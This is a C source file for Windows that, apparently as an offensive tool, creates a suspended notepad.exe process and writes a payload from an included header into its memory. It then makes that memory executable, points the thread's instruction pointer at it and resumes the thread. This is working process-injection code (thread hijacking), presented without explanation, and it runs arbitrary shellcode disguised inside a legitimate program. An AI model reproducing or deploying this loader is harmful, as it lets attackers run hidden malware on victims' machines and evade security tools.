#include <windows.h>
#include <stdio.h>
#include "Payload.h"

int main( void ) {

    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof( si );

    if ( !CreateProcessA( NULL, "C:\\Windows\\System32\\notepad.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi ) ) {
        fprintf( stderr, "CreateProcess failed (%d)\n", GetLastError() );
        return 1;
    }

    printf( "[+] Created process with pid: %d\n", pi.dwProcessId );

    LPVOID pRemoteMem = VirtualAllocEx( pi.hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );

    if ( pRemoteMem == NULL ) {
        fprintf( stderr, "VirtualAllocEx failed (%d)\n", GetLastError() );
        return 1;
    }

    printf( "[+] Allocated %d bytes at %p\n", payloadSize, pRemoteMem );

    SIZE_T bytesWritten;
    if ( !WriteProcessMemory( pi.hProcess, pRemoteMem, payload, payloadSize, &bytesWritten ) || bytesWritten != payloadSize ) {
        fprintf( stderr, "WriteProcessMemory failed (%d)\n", GetLastError() );
        return 1;
    }

    printf( "[+] Wrote %lld bytes to %p\n", bytesWritten, pRemoteMem );

    DWORD oldProtect;
    if ( !VirtualProtectEx( pi.hProcess, pRemoteMem, payloadSize, PAGE_EXECUTE_READ, &oldProtect ) ) {
        fprintf( stderr, "VirtualProtectEx failed (%d)\n", GetLastError() );
        return 1;
    }

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;

    if ( !GetThreadContext( pi.hThread, &ctx ) ) {
        fprintf( stderr, "GetThreadContext failed (%d)\n", GetLastError() );
        return 1;
    }

    ctx.Rip = ( DWORD64 )pRemoteMem;

    if ( !SetThreadContext( pi.hThread, &ctx ) ) {
        fprintf( stderr, "SetThreadContext failed (%d)\n", GetLastError() );
        return 1;
    }

    ResumeThread( pi.hThread );
    printf( "[+] Resumed thread %d\n", pi.dwThreadId );


    CloseHandle( pi.hThread );
    CloseHandle( pi.hProcess );

    return 0;
}
